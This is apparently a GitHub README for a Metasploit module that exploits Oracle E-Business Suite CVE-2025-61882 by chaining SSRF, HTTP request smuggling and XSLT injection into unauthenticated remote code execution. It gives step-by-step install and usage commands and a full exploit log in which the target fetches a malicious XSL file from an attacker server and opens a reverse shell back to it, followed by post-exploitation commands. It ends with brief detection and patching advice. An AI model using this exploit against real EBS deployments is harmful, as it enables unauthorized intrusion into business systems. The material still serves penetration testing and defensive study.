# Metasploit-Modules

# Oracle E-Business Suite CVE-2025-61882 RCE
## SSRF + HTTP Request Smuggling + XSLT Injection → Remote Command Execution 

# IMPORTANT: As of Jan 22nd 2026, this module is now part of the official metasploit modules. You can update your metasploit version to get the latest modules.
[Link to the official module version](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/http/oracle_ebs_cve_2025_61882_exploit_rce.rb)

## Description

This module exploits **CVE-2025-61882**, a critical Remote Code Execution (RCE) vulnerability in **Oracle E-Business Suite (EBS)**. The flaw allows unauthenticated attackers to execute arbitrary code by leveraging a combination of SSRF, HTTP request smuggling and XSLT injection.

The exploit uses Metasploit's `HttpServer` mixin to handle requests for any `.xsl` endpoint. When the target fetches the stylesheet (via XML processing in EBS), it triggers the payload.

- **CVSS Score**: 9.8 Critical
- **Affected Versions**: Oracle E-Business Suite, versions 12.2.3-12.2.14
- **Tested On**: Oracle EBS 12.2.12 on Linux

**Note**: This is a **proof-of-concept** module for educational/red teaming purposes. Use responsibly and only on authorized systems.

## Features
- Automatic payload delivery through a smuggled HTTP request
- XSLT injection allowing arbitrary command execution
- Fully interactive reverse shell support
- Compatible with Metasploit’s handler
- Customizable payloads and targets
- Built entirely using native Metasploit Ruby APIs

## Screenshots
<img width="1095" height="452" alt="session-oracle-ebs" src="https://github.com/user-attachments/assets/eb98e150-f599-47fb-ac51-8031bfeefcd6" />

With Meterpreter payload:
<img width="1222" height="511" alt="Screenshot from 2026-01-17 13-31-56" src="https://github.com/user-attachments/assets/b47c3721-fe5e-403b-a2ac-11edc2f92366" />
<img width="638" height="116" alt="Screenshot from 2026-01-17 13-31-36" src="https://github.com/user-attachments/assets/d80bb400-2783-4d0a-ac89-fd55d2e67a30" />


## 🚀 Installation & Usage (Metasploit)

**1. Copy the exploit module into Metasploit’s module directory**

```
cp oracle_ebs_cve_2025_61882_rce.rb ~/.msf4/modules/exploits/multi/http/
```
**2.Start MSF**

```
msfconsole
```

**3. Load the module**

```
use exploit/multi/http/oracle_ebs_cve_2025_61882_rce
```

**4. Configure the required parameters**
<img width="899" height="573" alt="options-oracle-EBS-metasploit-module" src="https://github.com/user-attachments/assets/22aea551-1f83-44ba-8ea1-153550fd6d48" />

**5.Check or Exploit**

```
msf6 exploit(multi/http/oracle_ebs_cve_2025_61882_exploit_rce) > check
[*] 192.168.56.104:8000 - The target appears to be vulnerable.


msf6 exploit(multi/http/oracle_ebs_cve_2025_61882_exploit_rce) > exploit
[*] Exploit running as background job 1.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 192.168.56.1:4444 
[*] Starting HTTP server on 0.0.0.0:1337
[*] Using URL: http://192.168.56.1:1337/
[*] XSL payload will be served at: http://192.168.56.1:1337/HexdwvgO.xsl
[*] Retrieving CSRF token from target...
[+] CSRF token retrieved: 86AJ-2RR3-XDNC-U9I4-Y...
[*] Creating HTTP request smuggling payload...
[*] Triggering exploitation via UiServlet...
[+] Received request: GET /OA_HTML/ieshostedsurvey.xsl from 192.168.56.104:63162
[+] Serving  XSL payload to 192.168.56.104...
[+] XSL payload delivered successfully to 192.168.56.104 (1460 bytes)
[*] Keeping HTTP server alive, waiting for callback to 192.168.56.1:4444...
[*] (Press Ctrl-C to stop)
[*] Waiting up to 30 seconds for reverse shell connection...
[+] Session created successfully!
[*] Server stopped.
[*] Command shell session 1 opened (192.168.56.1:4444 -> 192.168.56.104:61062) at 2025-12-04 09:14:42 +0100
sessions 1
[*] Starting interaction with 1...

id
uid=54321(oracle) gid=54321(oinstall) groups=54321(oinstall),54322(dba) context=system_u:system_r:initrc_t:s0
uname -a
Linux apps 5.4.17-2136.338.4.2.el7uek.x86_64 #3 SMP Mon Dec 23 14:42:43 PST 2024 x86_64 x86_64 x86_64 GNU/Linux
pwd
/u01/install/APPS/fs1/FMW_Home/user_projects/domains/EBS_domain
```

## Tips for Oracle EBS Sandbox setup

- App images files are available on Oracle website (Oracle Software Delivery Cloud)
- You can follow this [setup guide for Oracle EBS](https://blog.rishoradev.com/2021/04/12/oracle-ebs-r12-on-virtualbox)

**Note**: 300 Go (!)  will be needed and a few hours for the inital image creation

## Detection & Mitigation
- Patch Oracle EBS per [Oracle Security Alert](https://www.oracle.com/security-alerts/).
- WAF rules: Block suspicious XSL fetches.
- IDS: Monitor for `.xsl` with embedded scripts.

## References
- [Oracle Critical Patch Update](https://www.oracle.com/security-alerts/alert-cve-2025-61882.html)
- [Watchtowr blog article about the vulnerability analysis](https://labs.watchtowr.com/well-well-well-its-another-day-oracle-e-business-suite-pre-auth-rce-chain-cve-2025-61882well-well-well-its-another-day-oracle-e-business-suite-pre-auth-rce-chain-cve-2025-61882)

## Credits
- **Author**: [Mathieu Dupas](https://github.com/MatDupas)
- **Thanks**: WatchTowr for the original Python POC, Metasploit community, Rapid7 for the framework.

## License
MIT License 

**Disclaimer**: This tool is for authorized penetration testing only. The author is not responsible for misuse.
